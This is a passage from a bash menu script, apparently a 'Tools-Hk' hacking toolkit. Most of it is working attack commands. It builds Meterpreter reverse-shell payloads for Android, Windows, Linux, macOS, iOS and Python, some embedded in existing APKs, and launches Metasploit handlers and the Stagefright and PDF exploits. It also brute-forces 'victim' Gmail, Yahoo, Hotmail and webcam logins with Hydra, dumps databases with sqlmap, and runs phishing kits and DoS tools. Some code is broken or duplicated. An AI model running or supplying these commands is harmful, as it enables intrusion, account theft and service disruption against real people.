msfconsole -x 'use exploit/multi/handler' -x 'set exploit android/browser/stagefright_mp4_tx3g_64b' -x 'set SRVHOST' $lhost -x 'set URIPATH /' -X 'set -p linux/armle/mettle/reverse_tcp' -x 'set LHOST' $lhost -x 'set VERBOSE True' -x 'exploit'

fi
if [ $pa = 9 ]
then
clear
figlet "Payload pdf"
echo ""
echo '~_~_~_~_~_~_~_~_~_~_~_~_'
echo ""
echo -e $green "What is LHOST"
echo ""
echo '~_~_~_~_~_~_~_~_~_~_~_~_'
echo -e $green
read -p " insert : " lhost
echo ""
echo '~_~_~_~_~_~_~_~_~_~_~_~_'
echo ""
echo -e $green "What is LPORT"
echo ""
echo '~_~_~_~_~_~_~_~_~_~_~_~_'
echo -e $green
read -p " insert : " lport
echo ""
echo '~_~_~_~_~_~_~_~_~_~_~_~_~_~_~_~'
echo ""
echo -e $green "What is Name Payload"
echo ""
echo '~_~_~_~_~_~_~_~_~_~_~_~_~_~_~_~'
echo -e $green
read -p " insert : " name
echo ""
echo '~_~_~_~_~_~_~_~_~_~_~_~_~_~'
echo ""
echo -e $green "What is pathsave"
echo ""
echo '~_~_~_~_~_~_~_~_~_~_~_~_~_~'
read -p " insert : " pathsave
echo ""

msfconsole -x 'use exploit/android/fileformat/adobe_read -p " insert : "er_pdf_js_interface.rb' -x 'set lport '$lport -x 'set lhost '$lhost -x 'exploit' 
bash Tools-Hk.sh
fi
if [ $pa = 10 ]
then
clear
figlet "Embed Payload in APk"
echo ""
echo '~_~_~_~_~_~_~_~_~_~_~_~_'
echo ""
echo -e $green "What is LHOST"
echo ""
echo '~_~_~_~_~_~_~_~_~_~_~_~_'
echo -e $green
read -p " insert : " lhost
echo ""
echo '~_~_~_~_~_~_~_~_~_~_~_~_'
echo ""
echo -e $green "What is LPORT"
echo ""
echo '~_~_~_~_~_~_~_~_~_~_~_~_'
echo -e $green
read -p " insert : " lport
echo ""
echo '~_~_~_~_~_~_~_~_~_~_~_~_'
echo ""
echo -e $green "Path save APK "
echo ""
echo '~_~_~_~_~_~_~_~_~_~_~_~_'
echo -e $green
read -p " insert path with file.apk: " apkliget
echo ""
echo '~_~_~_~_~_~_~_~_~_~_~_~_~_~_~_~_'
echo ""
echo -e $green "What is Payload Name? "
echo ""
echo '~_~_~_~_~_~_~_~_~_~_~_~_~_~_~_~_'
echo -e $green
read -p " insert as SignApk without .apk: " name
echo ""
echo '~_~_~_~_~_~_~_~_~_~_~_~_~_~_~'
echo ""
echo -e $green "What is path seve "
echo ""
echo '~_~_~_~_~_~_~_~_~_~_~_~_~_~_~'
read -p " insert : " pathsave
echo ""
toilet "Loading" | lolcat
msfvenom -x $apkliget -p android/meterpreter/reverse_tcp LHOST=$lhost LPORT=$lport -o $pathsave/$name.apk
echo ""
echo -e $green "do you want start  metasploit? y/n"
echo -e $green
read -p " insert : " yes_no
if [ $yes_no = "y" ]
then
clear
echo '~_~_~_~_~_~_~_~_~_~_~_~_'
echo ""
echo -e $green "What is LHOST"
echo ""
echo '~_~_~_~_~_~_~_~_~_~_~_~_'
echo -e $green
read -p " insert : " host
echo ""
echo '~_~_~_~_~_~_~_~_~_~_~_~_'
echo ""
echo -e $green "What is LPORT"
echo ""
echo '~_~_~_~_~_~_~_~_~_~_~_~_'
echo -e $green
read -p " insert : " port
echo ""
toilet "START" | lolcat
msfconsole -x "use multi/handler; set payload android/meterpreter/reverse_tcp; set LHOST $host; set LPORT $port; exploit"
else
bash Tools-Hk.sh
fi
fi
if [ $pa = 00 ]
then
clear
bash Tools-Hk.sh
fi
fi
if [ $injection_payload = 2 ]
then
cd venom
bash venom.sh
fi
if [ $injection_payload = 3 ]
then
clear
echo -e $green
figlet "PAYMAX"
cd ~
cd PAYMAX
python2 paymax.py
bash Tools-Hk.sh
fi
if [ $injection_payload = 4 ]
then
clear

head
dependencies
camphish

fi
if [ $injection_payload = 00 ]
then
clear
bash Tools-Hk.sh
fi
fi
####################
if [ $kali = 2 ]
then
clear
head
echo -e $green   "Scan Ip"
echo ""
echo -e $green     '{ -1- } ===> ' $white " nmap"
echo ""
echo -e $green     '{ -2- } ===> ' $green " Devploit"
echo ""
echo ""
echo -e $green     "00- BACK"
echo ""
echo ""
read -p " insert : " scanport
if [ $scanport = 1 ]
then
clear
figlet "scan nmap"
echo ""
echo -e $green "What is Ip web/device "
echo -e $green
read -p " insert : " ip
echo ""
toilet "Loading" 
nmap $ip
fi
if [ $scanport = 2 ]
then
clear
figlet "scan Devploit"
echo ""
echo ""
toilet "Loading" 
cd ~
cd Devploit
python2 Devploit
fi
if [ $scanport = 00 ]
then
clear
bash Tools-Hk.sh
fi
fi
####################
if [ $kali = 3 ]
then
clear
head
echo -e $green   "Account Hack"
echo ""
echo -e $green     '{ -1- } ===> ' $white " Crunch wordlist"
echo ""
echo -e $green     '{ -2- } ===> ' $green " Hydra"
echo ""
echo -e $green     '{ -3- } ===> ' $white " weeman"
echo ""
echo -e $green     '{ -4- } ===> ' $green " socialfish"
echo ""
echo ""
echo -e $green     "00- BACK"
echo ""
echo ""
read -p " insert : " accountHk
if [ $accountHk = 1 ]
then
clear
figlet "Creat wordlist"
echo ""
echo -e $green "what is the username ? "
echo -e $green
read -p " insert : " user
echo -e $green "the phone or any number .. "
echo -e $green
read -p " insert : " phone
echo -e $green "name list ex :pass.txt "
echo -e $green
read -p " insert : " namelist
echo -e $green "little user name + phone = ? example : mohammed773532224 = little = 8 phone =9 then 8+9=17 "
echo -e $green
read -p " insert : " much
echo -e $green "please insert path save ex:/sdcard/"
echo -e $green
read -p " insert : " pathsave
echo -e $green "insert your pass hack ex:user@@@@@"
echo -e $green
read -p " insert : " num
toilet "Loading"
crunch $much $much $phone -t $num -o $pathsave$namelist
bash Tools-Hk.sh
fi
if [ $accountHk = 2 ]
then
clear
head
echo -e $green   "Hydra"
echo ""
echo -e $green     '{ -1- } ===> ' $white " Hotmail"
echo ""
echo -e $green     '{ -2- } ===> ' $green " Yahoo"
echo ""
echo -e $green     '{ -3- } ===> ' $white " Gmail"
echo ""
echo ""
echo -e $green     "00- BACK"
echo ""
read -p " insert : " hydra
if [ $hydra = 1 ]
then
clear
figlet "Hotmail Hack"
echo -e $yellow "please insert vactime email ..""ex : hdhw@hotmail.com"
echo -e $green
read -p " insert : " hayd
echo -e $yellow "please insert path wordlist .."" ex : $HOME/pass.txt"
echo -e $green
read -p " insert : " pass
hydra -S -l $hayd -P $pass -v -V -e ns -s 578 smtp.live.com smtp
fi
if [ $hydra = 2 ]
then
clear
figlet "Yahoo Hack"
echo -e $yellow "please insert vactime email ..""ex : dhsa@yahoo.com"
echo -e $green
read -p " insert : " hayd
echo -e $yellow "please insert path wordlist ...""ex : $HOME/pass.txt"
echo -e $green
read -p " insert : " pass
hydra -S -l $hayd -P $pass -v -V -e ns -s 578 smtp.mail.yahoo smtp
bash Tools-Hk.sh
fi
if [ $hydra = 3 ]
then
clear
figlet "Gmail Hack"
echo -e $yellow "please insert victim email .."
echo -e $green
read -p " insert : " hayd
echo -e $yellow "please insert path wordlist..."
echo -e $green
read -p " insert : " pass
hydra -S -l $hayd -P $pass -v -V -e ns -s 465 smtp.gmail.com smtp
bash Tools-Hk.sh
fi
if [ $hydra = 00 ]
then
clear
bash Tools-Hk.sh
fi
fi
if [ $accountHk = 3 ]
then
clear
figlet "weeman"
cd ~
cd Tools-Hk/weeman
python2 weeman.py
bash Tools-Hk.sh
fi
if [ $accountHk = 4 ]
then
clear
figlet "SocialFish"
cd ~
cd Tools-Hk/SocialFish
chmod +x SocialFish.py
pip install -r requirements.txt
pip2 install wget
python2 SocialFish.py
bash Tools-Hk.sh
fi
if [ $accountHk = 00 ]
then
clear
bash Tools-Hk.sh
fi
fi
if [ $kali = 4 ]
then
clear
head
echo -e $green   "web hack"
echo ""
echo -e $green     '{ -1- } ===> ' $white " Sqlmap"
echo ""
echo -e $green     '{ -2- } ===> ' $green " Scriptux(creat index)"
echo ""
echo -e $green     '{ -3- } ===> ' $white " sniper-h(list hash)"
echo ""
echo -e $green     '{ -4- } ===> ' $green " Hash Mix"
echo ""
echo -e $green     '{ -5- } ===> ' $white " hash-identifier"
echo ""
echo -e $green     '{ -6- } ===> ' $green " dirsearch"
echo ""
echo -e $green     "00- BACK"
echo ""
read -p " insert : " whk
if [ $whk = 1 ]
then
clear
echo -e $yellow "please insert web url"
read -p " insert : " wehk
echo ""
echo $wehk
echo ""
sqlmap -u $wehk  --dbs
echo "" 
echo "please insert database"
read -p " insert : " data
sqlmap -u $wehk -D $data --tables
echo ""
echo -e $yellow "please insert table"
read -p " insert : " table
sqlmap -u $wehk -D $data -T $table --columns
echo ""
echo -e $yellow "please insert columns"
read -p " insert : " columns
sqlmap -u $wehk -D $data -T $table -C $columns --dump
echo ""
echo -e $yellow "Do you want define type hash insert y/n "
read -p " insert : " typehash
if [ $typehash = "y" ]
then
clear
cd ~
cd hash-identifier.py
python2 hash-identifier.py

else
bash Tools-Hk.sh
fi
fi
if [ $whk = 2 ]
then
clear
figlet "Creat index "
cd ~
cd Tools-Hk/Scriptux
sudo su
python2 scriptux.py
bash Tools-Hk.sh
fi
if [ $whk = 3 ]
then
clear
figlet "sniper-h "
cd ~
cd Tools-Hk/sniper-h
echo -e $yellow "Do you have list Hash ? please insert y/n"
read -p " insert : " pathlist
if [ $pathlist = "y" ]
then
clear
figlet "sniper-h"
echo -e $yellow "please insert path list ex : /sdcard/wordlist.txt"
read -p " insert : " pa
python3 sniper-h.py -H $Hash -W $pa -T md5
bash Tools-Hk.sh
else
cd ~
cd sniper-h
python3 sniper-h.py -H $Hash -W wordlist.txt -T md5
bash Tools-Hk.sh
fi
fi
if [ $whk = 4 ]
then
clear
figlet "Hash Mix "
git clone https://github.com/Matrix07ksa/HashMix
cd ~
cd Tools-Hk/HashMix
chmod +x hashmix.py
python2 hashmix.py
fi
if [ $whk = 5 ]
then
clear
figlet "hash-identifier"
cd ~
cd hash-identifier.py
python2 hash-identifier.py
fi
if [ $whk = 6 ]
then
clear
figlet "dirsearch "
cd ~
cd dirsearch
echo -e $yellow "please insert url"
read -p " insert : " url
python3 dirsearch.py -u $url -e *
bash Tools-Hk.sh
fi
if [ $whk = 00 ]
then
clear
bash Tools-Hk.sh
fi
fi
if [ $kali = 5 ]
then
clear
head
echo -e $green      " DDos Attack"
echo ""
echo -e $green     '{ -1- } ===> ' $white " slowloris"
echo ""
echo -e $green     '{ -2- } ===> ' $green " Hammer"
echo ""
echo ""
echo -e $green     "00- BACK"
echo ""
read -p " insert : " Ddosattack
if [ $Ddosattack = 1 ]
then
clear
figlet "Slowloris "
cd ~
git clone https://github.com/gkbrk/slowloris.git
cd slowloris
python setup.py
figlet "Dos Attack"
echo -e $yellow "please insert url web"
read -p " insert : " url
python slowloris.py $url
fi
if [ $Ddosattack = 2 ]
then
clear
figlet "Hammer "
cd ~
cd hammer
echo -e $yellow "please insert ip web.."
read -p " insert : " ip
echo -e $yellow "please insert port defult :80"
read -p " insert : " port
echo -e $yellow "please insert speed defult :135"
read -p " insert : " speed
python3 hammer.py -s $ip -p $port -t $speed
bash Tools-Hk.sh
fi
if [ $Ddosattack = 00 ]
then
clear
bash Tools-Hk.sh
fi
fi
if [ $kali = 6 ]
then
clear
head
echo -e $green   "Scan port"
echo ""
echo -e $green     '{ -1- } ===> ' $white " nmap"
echo ""
echo -e $green     '{ -2- } ===> ' $green " Devploit"
echo ""
echo ""
echo -e $green     "00- BACK"
echo ""
echo ""
read -p " insert : " scanport1
if [ $scanport1 = 1 ]
then
clear
figlet "scan nmap"
echo ""
echo -e $green "What is Ip  web/device "
echo -e $green
read -p " insert : " ip
echo ""
toilet "Loading" 
nmap -sV $ip
fi
if [ $scanport1 = 2 ]
then
clear
figlet "scan Devploit"
echo ""
echo ""
toilet "Loading" 
cd ~
cd Devploit
python2 Devploit
fi
if [ $scanport1 = 00 ]
then
clear
bash Tools-Hk.sh
fi
fi
if [ $kali = 7 ]
then
clear
head
echo -e $green   "cread -p " insert : " word list by crunch"
echo ""
echo -e $green '{ -1- } ===> ' $white " creat (list password)"
echo ""
echo "" 
echo -e $green     "00- BACK"
read -p " insert : " start
if [ $start = 1 ]
then

figlet "Creat wordlist"
echo ""
echo -e $white '~_~_~_~_~_~_~_~_~_~_~_~_~_~_~_~_~_~_~_~_~_~'
echo ""
echo -e $green "what is the first: char or number ? ex: 12 "
echo ""
echo -e $white '~_~_~_~_~_~_~_~_~_~_~_~_~_~_~_~_~_~_~_~_~_~'

echo -e $green
read -p " insert : " user

echo -e $white '~_~_~_~_~_~_~_~_~_~_~_~_~_~_~_~_~_~_~_~_~_~'
echo ""
echo -e $green " second:  insert  any number .. ex: 123456 "
echo ""
echo -e $white '~_~_~_~_~_~_~_~_~_~_~_~_~_~_~_~_~_~_~_~_~_~'

echo -e $green
read -p " insert : " phone
echo -e $white '~_~_~_~_~_~_~_~_~_~_~_~_~_~_~_~_~_~_~_~_~_~'
echo ""
echo -e $green "name list ex :pass.txt "
echo ""
echo -e $white '~_~_~_~_~_~_~_~_~_~_~_~_~_~_~_~_~_~_~_~_~_~'

echo -e $green
read -p " insert : " namelist
echo -e $white '~_~_~_~_~_~_~_~_~_~_~_~_~_~_~_~_~_~_~_~_~_~'
echo ""
echo -e $green " sum little first  + second = ? example : mohammed773532224 = first = 8 second =9 then 8+9=17 "
echo ""
echo -e $white '~_~_~_~_~_~_~_~_~_~_~_~_~_~_~_~_~_~_~_~_~_~'

echo -e $green
read -p " insert : " much
echo -e $white '~_~_~_~_~_~_~_~_~_~_~_~_~_~_~_~_~_~_~_~_~_~'
echo ""
echo -e $green "please insert path save ex:/sdcard/"
echo ""
echo -e $white '~_~_~_~_~_~_~_~_~_~_~_~_~_~_~_~_~_~_~_~_~_~'

echo -e $green
read -p " insert : " pathsave
echo -e $white '~_~_~_~_~_~_~_~_~_~_~_~_~_~_~_~_~_~_~_~_~_~'
echo ""
echo -e $green "insert your pass hack ex:first@@@@@"
echo ""
echo -e $white '~_~_~_~_~_~_~_~_~_~_~_~_~_~_~_~_~_~_~_~_~_~'

echo -e $green
read -p " insert : " num
toilet "Loading"
crunch $much $much $phone -t $num -o $pathsave$namelist
bash Tools-Hk.sh

fi
if [ $start = 00 ]
then
clear
bash Tools-Hk.sh
fi
fi
if [ $kali = 8 ]
then
figlet "Hack WebCam Ip With Hydra"
echo -e $yellow "insert the port >> "
echo -e $green
read -p " insert : " porthydra
echo -e $yellow
echo -e $green "insert the list password path /rockyou.txt >> "
echo ""
read -p " insert : " listpathhydra
echo ""
echo -e $yellow "please insert WebCam IP >>"
echo -e $green
read -p " insert : " webcamip
echo ""
hydra -s $porthydra -l admin -p $listpathhydra $webcamip -e ns -t 64 -v http-get
fi

if [ $kali = 00 ]
then
clear
bash Tools-Hk.sh
fi
fi
if [ $usetools = 2 ]
then
clear
head
echo -e $green   "use automatic Tools"
echo ""
echo -e $green '{ -1- } ===> ' $white " injection payloads"
echo ""
echo -e $green '{ -2- } ===> ' $green " Scan Ip"
echo ""
echo -e $green '{ -3- } ===> ' $white " account hack"
echo ""
echo -e $green '{ -4- } ===> ' $green " send sms"
echo ""
echo -e $green '{ -5- } ===> ' $white " web hack"
echo ""
echo -e $green '{ -6- } ===> ' $green " dos attack"
echo ""
echo -e $green '{ -7- } ===> ' $white " scan port"
echo ""
echo -e $green '{ -8- } ===> ' $green " wifi hack"
echo ""
echo -e $green "00- Back "
echo ""
read -p " insert : " usage
if [ $usage = 1 ]
then
clear
head
echo -e $green   "Injection payloads"
echo ""
echo -e $green '{ -1- } ===> ' $white " msfvenom"
echo ""
echo -e $green '{ -2- } ===> ' $green " Tmux-Bunch"
echo ""
echo -e $green '{ -3- } ===> ' $white " PAYMAX"
echo ""
echo -e $green "00- Back "
echo ""
read -p " insert : " injection_payload
if [ $injection_payload = 1 ]
then
clear
echo ""
head
echo -e $green   "msfvenom"
echo ""
echo -e $green     '{ -1- } ===> ' $white " Payload Android"
echo -e $green     '{ -2- } ===> ' $green " Payload Windows"
echo -e $green     '{ -3- } ===> ' $white " Payload Linux"
echo -e $green     '{ -4- } ===> ' $green " Payload Mac"
echo -e $green     '{ -5- } ===> ' $white " Payload Ios"
echo -e $green     '{ -6- } ===> ' $green " Payload Python"
echo -e $green     '{ -7- } ===> ' $white " Payload url"
echo -e $green     '{ -8- } ===> ' $green " Payload mp4"
echo -e $green     '{ -9- } ===> ' $white " Payload Pdf"
echo ""

echo -e $green     "00- BACK"
echo ""
echo ""
echo -e $green     "Enter The Number"
echo -e $green
read -p " insert : " pa
if [ $pa = 1 ]
then
clear
figlet "Payload Android"
echo ""
echo '~_~_~_~_~_~_~_~_~_~_~_~_'
echo ""
echo -e $green "What is LHOST"
echo ""
echo '~_~_~_~_~_~_~_~_~_~_~_~_'
echo -e $green
read -p " insert : " lhost
echo ""
echo '~_~_~_~_~_~_~_~_~_~_~_~_'
echo ""
echo -e $green "What is LPORT"
echo ""
echo '~_~_~_~_~_~_~_~_~_~_~_~_'
echo -e $green
read -p " insert : " lport
echo ""
echo '~_~_~_~_~_~_~_~_~_~_~_~_~_~_~_~_'
echo ""
echo -e $green "What is Name Payload? "
echo ""
echo '~_~_~_~_~_~_~_~_~_~_~_~_~_~_~_~_'
echo -e $green
read -p " insert : " name
echo ""
echo '~_~_~_~_~_~_~_~_~_~_~_~_~_~_~'
echo ""
echo -e $green "What is path seve "
echo ""
echo '~_~_~_~_~_~_~_~_~_~_~_~_~_~_~'
read -p " insert : " pathsave
echo ""
toilet "Loading" | lolcat
msfvenom -p android/meterpreter/reverse_tcp LHOST=$lhost LPORT=$lport -o $pathsave/$name.apk
echo ""
echo -e $green "do you want start  metasploit? y/n"
echo -e $green
read -p " insert : " yes_no
if [ $yes_no = "y" ]
then
clear
echo '~_~_~_~_~_~_~_~_~_~_~_~_'
echo ""
echo -e $green "What is LHOST"
echo ""
echo '~_~_~_~_~_~_~_~_~_~_~_~_'
echo -e $green
read -p " insert : " host
echo ""
echo '~_~_~_~_~_~_~_~_~_~_~_~_'
echo ""
echo -e $green "What is LPORT"
echo ""
echo '~_~_~_~_~_~_~_~_~_~_~_~_'
echo -e $green
read -p " insert : " port
echo ""
toilet "START" | lolcat
msfconsole -x 'use multi/handler' -x 'set payload android/meterpreter/reverse_tcp' -x 'set LHOST '$host -x 'set LPORT '$port -x 'exploit'
else
bash Tools-Hk.sh
fi
fi
if [ $pa = 2 ]
then
clear
figlet "Make Payload Windows"
echo ""
echo '~_~_~_~_~_~_~_~_~_~_~_~_'
echo ""
echo -e $green "What is LHOST"
echo ""
echo '~_~_~_~_~_~_~_~_~_~_~_~_'
echo -e $green
read -p " insert : " lhost
echo ""
echo '~_~_~_~_~_~_~_~_~_~_~_~_'
echo ""
echo -e $green "What is LPORT"
echo ""
echo '~_~_~_~_~_~_~_~_~_~_~_~_'
echo -e $green
read -p " insert : " lport
echo ""
echo '~_~_~_~_~_~_~_~_~_~_~_~_~_~_~_~_'
echo ""
echo -e $green "What is Name Payload?"
echo ""
echo '~_~_~_~_~_~_~_~_~_~_~_~_~_~_~_~_'
echo -e $green

read -p " insert : " name
echo ""
echo '~_~_~_~_~_~_~_~_~_~_~_~_~_~_~_~_~_~_'
echo ""
echo -e $green "What is Path Save Payload"
echo ""
echo '~_~_~_~_~_~_~_~_~_~_~_~_~_~_~_~_~_~_~'
echo ""
read -p " insert : " pathsave
toilet "loading" | lolcat
msfvenom -p windows/meterpreter/reverse_tcp LHOST=$lhost LPORT=$lport -f exe -o $Pathsave/$name.exe
echo ""
echo -e $green "do you want start metasploit? y/n"
echo -e $green
read -p " insert : " yes_no
if [ $yes_no = "y" ]
then
clear
echo '~_~_~_~_~_~_~_~_~_~_~_~_'
echo ""
echo -e $green "What is LHOST"
echo ""
echo '~_~_~_~_~_~_~_~_~_~_~_~_'
echo -e $green
read -p " insert : " host
echo ""
echo '~_~_~_~_~_~_~_~_~_~_~_~_'
echo ""
echo -e $green "What is LPORT"
echo ""
echo '~_~_~_~_~_~_~_~_~_~_~_~_'
echo -e $green
read -p " insert : " port
echo ""
toilet "START" | lolcat
msfconsole -x 'use exploit/multi/handler' -x 'set payload windows/meterpreter/reverse_tcp' -x 'set lport '$port -x 'set lhost '$host -x 'exploit'
else
bash Tools-Hk.sh
fi
fi
if [ $pa = 3 ]
then
clear
figlet "Payload linux"
echo ""
echo '~_~_~_~_~_~_~_~_~_~_~_~_'
echo ""
echo -e $green "What is LHOST"
echo ""
echo '~_~_~_~_~_~_~_~_~_~_~_~_'
echo -e $green
read -p " insert : " lhost
echo ""
echo '~_~_~_~_~_~_~_~_~_~_~_~_'
echo ""
echo -e $green "What is LPORT"
echo ""
echo '~_~_~_~_~_~_~_~_~_~_~_~_'
echo -e $green
read -p " insert : " lport
echo ""
echo '~_~_~_~_~_~_~_~_~_~_~_~_~_~_~_~'
echo ""
echo -e $green "What is Name Payload"
echo ""
echo '~_~_~_~_~_~_~_~_~_~_~_~_~_~_~_~'
echo -e $green
read -p " insert : " name
echo ""
echo '~_~_~_~_~_~_~_~_~_~_~_~_~_~'
echo ""
echo -e $green "What is pathsave"
echo ""
echo '~_~_~_~_~_~_~_~_~_~_~_~_~_~'
read -p " insert : " -p " insert : " pathsave
echo ""
toilet "Loading" | lolcat
msfvenom -p linux/x86/meterpreter/reverse_tcp -f elf LHOST=$lhost LPORT=$lport -o $pathsave/$name.elf
echo ""
echo -e $green "do you want start metasploit? y/n"
echo -e $green
read -p " insert : " yes_no
if [ $yes_no = "y" ]
then
clear
echo '~_~_~_~_~_~_~_~_~_~_~_~_'
echo ""
echo -e $green "What is LHOST"
echo ""
echo '~_~_~_~_~_~_~_~_~_~_~_~_'
echo -e $green
read -p " insert : " host
echo ""
echo '~_~_~_~_~_~_~_~_~_~_~_~_'
echo ""
echo -e $green "What is LPORT"
echo ""
echo '~_~_~_~_~_~_~_~_~_~_~_~_'
echo -e $green
read -p " insert : " port
echo ""
toilet "START" | lolcat
msfconsole -x 'use exploit/multi/handler' -x 'set payload linux/x86/meterpreter/reverse_tcp' -x 'set lport '$port -x 'set lhost '$host -x 'exploit'
clear
echo -e $green"Save Payload To" $HOME/$namp.elf
else
bash Tools-Hk.sh
fi
fi
if [ $pa = 4 ]
then
clear
figlet "Payload mac"
echo ""
echo '~_~_~_~_~_~_~_~_~_~_~_~_'
echo ""
echo -e $green "What is LPORT"
echo ""
echo '~_~_~_~_~_~_~_~_~_~_~_~_'
echo -e $green
read -p " insert : " lport
echo ""
echo '~_~_~_~_~_~_~_~_~_~_~_~_~_~_~_~'
echo ""
echo -e $green "What is Name Payload"
echo ""
echo '~_~_~_~_~_~_~_~_~_~_~_~_~_~_~_~'
echo -e $green
read -p " insert : " name
echo ""
echo '~_~_~_~_~_~_~_~_~_~_~_~_~_~'
echo ""
echo -e $green "What is pathsave"
echo ""
echo '~_~_~_~_~_~_~_~_~_~_~_~_~_~'
read -p " insert : " pathsave
echo ""
echo ""
toilet "Loading" | lolcat
msfvenom -p osx/x64/meterpreter_reverse_tcp -f macho LHOST=$lhost LPORT=$lport -o $pathsave/$name.macho
echo ""
echo -e $green "do you want start metasploit? y/n"
echo -e $green
read -p " insert : " yes_no
if [ $yes_no = "y" ]
then
clear
echo '~_~_~_~_~_~_~_~_~_~_~_~_'
echo ""
echo -e $green "What is LHOST"
echo ""
echo '~_~_~_~_~_~_~_~_~_~_~_~_'
echo -e $green
read -p " insert : " host
echo ""
echo '~_~_~_~_~_~_~_~_~_~_~_~_'
echo ""
echo -e $green "What is LPORT"
echo ""
echo '~_~_~_~_~_~_~_~_~_~_~_~_'
echo -e $green
read -p " insert : " port
echo ""
toilet "START" | lolcat
msfconsole -x 'use exploit/multi/handler' -x 'set payload osx/x64/meterpreter_reverse_tcp' -x 'set lport '$port -x 'set lhost '$host -x 'exploit'
else
bash Tools-Hk.sh
fi
fi
if [ $pa = 5 ]
then
clear
figlet "Payload ios"
echo ""
echo '~_~_~_~_~_~_~_~_~_~_~_~_'
echo ""
echo -e $green "What is LPORT"
echo ""
echo '~_~_~_~_~_~_~_~_~_~_~_~_'
echo -e $green
read -p " insert : " lport
echo ""
echo '~_~_~_~_~_~_~_~_~_~_~_~_~_~_~_~'
echo ""
echo -e $green "What is Name Payload"
echo ""
echo '~_~_~_~_~_~_~_~_~_~_~_~_~_~_~_~'
echo -e $green
read -p " insert : " name
echo ""
echo '~_~_~_~_~_~_~_~_~_~_~_~_~_~'
echo ""
echo -e $green "What is pathsave"
echo ""
echo '~_~_~_~_~_~_~_~_~_~_~_~_~_~'
read -p " insert : " pathsave
echo ""
echo -e $green
toilet "Loading" | lolcat
msfvenom -p apple_ios/aarch64/meterpreter_reverse_tcp LHOST=$lhost LPORT=$lport -o $pathsave/$name.api
echo ""
echo -e $green "do you want start metasploit? y/n"
echo -e $green
read -p " insert : " yes_no
if [ $yes_no = "y" ]
then
clear
echo '~_~_~_~_~_~_~_~_~_~_~_~_'
echo ""
echo -e $green "What is LPORT"
echo ""
echo '~_~_~_~_~_~_~_~_~_~_~_~_'
echo -e $green
read -p " insert : " lport
echo ""
echo '~_~_~_~_~_~_~_~_~_~_~_~_~_~_~_~'
echo ""
echo -e $green "What is Name Payload"
echo ""
echo '~_~_~_~_~_~_~_~_~_~_~_~_~_~_~_~'
echo -e $green
read -p " insert : " name
echo ""
echo '~_~_~_~_~_~_~_~_~_~_~_~_~_~'
echo ""
echo -e $green "What is pathsave"
echo ""
echo '~_~_~_~_~_~_~_~_~_~_~_~_~_~'
read -p " insert : " pathsave
echo ""
echo ""
toilet "START" | lolcat
msfvenom -p apple_ios/aarch64/meterpreter_reverse_tcp  LHOST=$lhost LPORT=$lport -o $pathsave/$name.api
else
bash Tools-Hk.sh
fi
fi
if [ $pa = 6 ]
then
clear
figlet "Payload python"
echo ""
echo '~_~_~_~_~_~_~_~_~_~_~_~_'
echo ""
echo -e $green "What is LHOST"
echo ""
echo '~_~_~_~_~_~_~_~_~_~_~_~_'
read -p " insert : " lhost
echo ""
echo '~_~_~_~_~_~_~_~_~_~_~_~_'
echo ""
echo -e $green "What is LPORT"
echo ""
echo '~_~_~_~_~_~_~_~_~_~_~_~_'
echo -e $green
read -p " insert : " lport
echo ""
echo '~_~_~_~_~_~_~_~_~_~_~_~_~_~_~_~'
echo ""
echo -e $green "What is Name Payload"
echo ""
echo '~_~_~_~_~_~_~_~_~_~_~_~_~_~_~_~'
echo -e $green
read -p " insert : " name
echo ""
echo '~_~_~_~_~_~_~_~_~_~_~_~_~_~'
echo ""
echo -e $green "What is pathsave"
echo ""
echo '~_~_~_~_~_~_~_~_~_~_~_~_~_~'
read -p " insert : " pathsave
echo ""
echo ""
toilet "Loading" | lolcat
msfvenom -f raw -p python/meterpreter/reverse_tcp LHOST=$lhost LPORT=$lport -o $pathsave/$name.py
echo ""
echo -e $green "do you want start  metasploit? y/n"
echo -e $green
read -p " insert : " yes_no
if [ $yes_no = "y" ]
then
clear
echo '~_~_~_~_~_~_~_~_~_~_~_~_'
echo ""
echo -e $green "What is LHOST"
echo ""
echo '~_~_~_~_~_~_~_~_~_~_~_~_'
echo -e $green
read -p " insert : " lhost
echo ""
echo '~_~_~_~_~_~_~_~_~_~_~_~_'
echo ""
echo -e $green "What is LPORT"
echo ""
echo '~_~_~_~_~_~_~_~_~_~_~_~_'
echo -e $green
read -p " insert : " lport
echo ""
toilet "START" | lolcat
msfconsole -x 'use exploit/multi/handler' -x 'set payload python/meterpreter/reverse_tcp' -x 'set lport '$lport -x 'set lhost '$lhost -x 'exploit'
else
bash Tools-Hk.sh
fi
fi
if [ $pa = 7 ]
then
clear
figlet "Payload url"
echo ""
echo '~_~_~_~_~_~_~_~_~_~_~_~_'
echo ""
echo -e $green "What is LHOST"
echo ""
echo '~_~_~_~_~_~_~_~_~_~_~_~_'
echo -e $green
read -p " insert : " lhost
echo ""
echo '~_~_~_~_~_~_~_~_~_~_~_~_'
echo ""
echo -e $green "What is LHOST"
echo ""
echo '~_~_~_~_~_~_~_~_~_~_~_~_'
echo -e $green
read -p " insert : " lport
echo ""
msfconsole -x 'use auxiliary/gather/android_htmlfileprovider' -x 'set lport '$lport -x 'set lhost '$lhost -x 'exploit'

fi
if [ $pa = 8 ]
then
clear
figlet "Payload mp4"
echo ""
echo '~_~_~_~_~_~_~_~_~_~_~_~_'
echo ""
echo -e $green "What is LHOST"
echo ""
echo '~_~_~_~_~_~_~_~_~_~_~_~_'
read -p " insert : " lhost
echo ""
toilet "START" | lolcat

msfconsole -x 'use exploit/multi/handler' -x 'set exploit android/browser/stagefright_mp4_tx3g_64b' -x 'set SRVHOST' $lhost -x 'set URIPATH /' -X 'set -p linux/armle/mettle/reverse_tcp' -x 'set LHOST' $lhost -x 'set VERBOSE True' -x 'exploit'



fi
if [ $pa = 9 ]
then
clear
figlet "Payload pdf"
echo ""
echo '~_~_~_~_~_~_~_~_~_~_~_~_'
echo ""
echo -e $green "What is LHOST"
echo ""
echo '~_~_~_~_~_~_~_~_~_~_~_~_'
echo -e $green
read -p " insert : " lhost
echo ""
echo '~_~_~_~_~_~_~_~_~_~_~_~_'
echo ""
echo -e $green "What is LPORT"
echo ""
echo '~_~_~_~_~_~_~_~_~_~_~_~_'
echo -e $green
read -p " insert : " lport
echo ""
echo '~_~_~_~_~_~_~_~_~_~_~_~_~_~_~_~'
echo ""
echo -e $green "What is Name Payload"
echo ""
echo '~_~_~_~_~_~_~_~_~_~_~_~_~_~_~_~'
echo -e $green
read -p " insert : " name
echo ""
echo '~_~_~_~_~_~_~_~_~_~_~_~_~_~'
echo ""
echo -e $green "What is pathsave"
echo ""
echo '~_~_~_~_~_~_~_~_~_~_~_~_~_~'
read -p " insert : " pathsave
echo ""
